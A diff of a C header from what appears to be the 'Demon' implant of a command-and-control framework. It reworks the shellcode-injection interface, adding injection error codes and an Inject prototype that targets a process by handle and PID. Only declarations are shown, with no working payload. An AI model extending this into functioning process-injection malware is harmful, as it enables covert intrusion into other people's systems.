@@ -4,11 +4,8 @@
 
 #include <Demon.h>
 
-// These are defined in the stdapi projects ps.h file. We should put them somewhere more generic so we dont dup them here.
-#define PROCESS_ARCH_UNKNOWN				0
-#define PROCESS_ARCH_X86					1
-#define PROCESS_ARCH_X64					2
-#define PROCESS_ARCH_IA64					3
+#include <Core/Memory.h>
+#include <Core/Thread.h>
 
 #define INJECTION_TECHNIQUE_WIN32           1
 #define INJECTION_TECHNIQUE_SYSCALL         2
@@ -20,13 +17,6 @@
 // defaults
 #define SPAWN_TECHNIQUE_DEFAULT             SPAWN_TECHNIQUE_SYSCALL
 #define INJECTION_TECHNIQUE_DEFAULT         INJECTION_TECHNIQUE_SYSCALL
-
-typedef enum _DX_MEMORY
-{
-    DX_MEM_DEFAULT  = 0,
-    DX_MEM_WIN32    = 1,
-    DX_MEM_SYSCALL  = 2,
-} DX_MEMORY;
 
 typedef enum _DX_CREATE_THREAD
 {
@@ -53,6 +43,24 @@ typedef struct INJECTION_CTX
 
     SHORT   Technique;
 } INJECTION_CTX, *PINJECTION_CTX ;
+
+/* injection errors */
+#define INJECT_ERROR_SUCCESS                0   /* no error. successful executed */
+#define INJECT_ERROR_FAILED                 1   /* aborted while trying to execute function */
+#define INJECT_ERROR_INVALID_PARAM          2   /* invalid param */
+#define INJECT_ERROR_PROCESS_ARCH_MISMATCH  3   /* process arch mismatches the injection arch */
+
+DWORD Inject(
+    IN BYTE   Method,
+    IN HANDLE Handle,
+    IN DWORD  Pid,
+    IN BOOL   x64,
+    IN PVOID  Payload,
+    IN SIZE_T Size,
+    IN UINT64 Offset,
+    IN PVOID  Argv,
+    IN SIZE_T Argc
+);
 
 // ShellcodeInjectDispatch
 BOOL  ShellcodeInjectDispatch( BOOL Inject, SHORT InjectionMethod, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx );
